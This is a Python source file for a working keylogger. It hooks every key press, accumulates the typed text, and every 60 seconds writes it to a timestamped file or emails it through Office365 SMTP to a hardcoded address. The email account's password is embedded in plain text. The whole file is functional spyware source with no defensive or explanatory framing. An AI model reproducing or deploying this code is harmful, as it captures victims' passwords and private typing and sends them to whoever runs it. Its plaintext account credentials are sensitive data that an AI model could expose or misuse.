#!/usr/bin/env python
import keyboard
import smtplib
from threading import Timer
from datetime import datetime
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText

SEND_REPORT_EVERY = 60
emailAddress = "reportsave82@gmail.com"
password = "!Teste123"

class Keylogger:
    def __init__(self, interval, report_method="email"):
        self.interval = interval
        self.report_method = report_method
        self.log = ""
        self.start_dt = datetime.now()
        self.end_dt = datetime.now()

    def callback(self, event):
        if event.event_type == keyboard.KEY_DOWN:
            if event.name == "space":
                self.log += " "
            elif event.name == "enter":
                self.log += "[ENTER]\n"
            elif len(event.name) == 1:
                self.log += event.name
            else:
                self.log += f"[{event.name.upper()}]"

    def update_filename(self):
        start_dt_str = str(self.start_dt)[:-7].replace(" ", "-").replace(":", "-")
        end_dt_str = str(self.end_dt)[:-7].replace(" ", "-").replace(":", "-")
        self.filename = f"keylog-{start_dt_str}_{end_dt_str}.txt"

    def report_to_file(self):
        with open(f"{self.filename}", "w") as f:
            f.write(self.log)
        print(f"[+] Saved {self.filename}")

    def prepare_email(self, message):
        msg = MIMEMultipart("alternative")
        msg["From"] = emailAddress
        msg["To"] = emailAddress
        msg["Subject"] = "Key Logs"
        html = f"<p> {message}</p>"
        text_part = MIMEText(message, "plain")
        html_part = MIMEText(html, "html")
        msg.attach(text_part)
        msg.attach(html_part)
        return msg.as_string()

    def sendmail(self, email, password, message, verbose=1):
        server = smtplib.SMTP(host="smtp.office365.com", port=587)
        server.starttls()
        server.login(email, password)
        server.sendmail(email, email, self.prepare_email(message))
        server.quit()
        if verbose:
            print(f"{datetime.now()} - Sent an email to {email} containing: {message}")

    def report(self):
        if self.log:
            self.end_dt = datetime.now()
            self.update_filename()
            if self.report_method == "email":
                self.sendmail(emailAddress, password, self.log)
            elif self.report_method == "file":
                self.report_to_file()
            print(f"[{self.filename}] - {self.log}")
            self.start_dt = datetime.now()
        self.log = ""
        timer = Timer(interval=self.interval, function=self.report)
        timer.daemon = True
        timer.start()

    def start(self):
        self.start_dt = datetime.now()
        keyboard.on_press(callback=self.callback)
        self.report()
        print(f"{datetime.now()} - Started Keylogger")
        keyboard.wait()

if __name__ == "__main__":
    keylogger = Keylogger(interval=SEND_REPORT_EVERY, report_method="file")
    keylogger.start()
